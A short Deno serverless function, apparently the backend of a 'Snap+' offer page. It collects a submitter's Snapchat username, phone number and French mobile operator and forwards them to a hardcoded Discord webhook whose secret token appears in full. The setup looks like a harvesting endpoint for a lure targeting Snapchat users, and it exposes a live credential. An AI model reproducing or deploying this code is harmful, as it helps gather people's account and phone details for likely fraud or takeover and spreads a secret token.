import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1513598405744787527/OfecKTmHVNK-0sUDt3f7n5PLo8qjUAkFgcOxtUZ95NKlzBqF_uSvfq7_9x1De-k9YxwW";

Deno.serve(async (req) => {
  const body = await req.json();
  const { snapchat, telephone, operateur } = body;

  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };

  const embed = {
    title: "👻 Nouvelle soumission Snap+",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "Snapchat", value: `\`${snapchat}\``, inline: true },
      { name: "Téléphone", value: `\`${telephone}\``, inline: true },
      { name: "Opérateur", value: `**${operateur}**`, inline: true },
    ],
    timestamp: new Date().toISOString(),
    footer: { text: "Snap+ Submission" },
  };

  await fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] }),
  });

  return Response.json({ ok: true });
});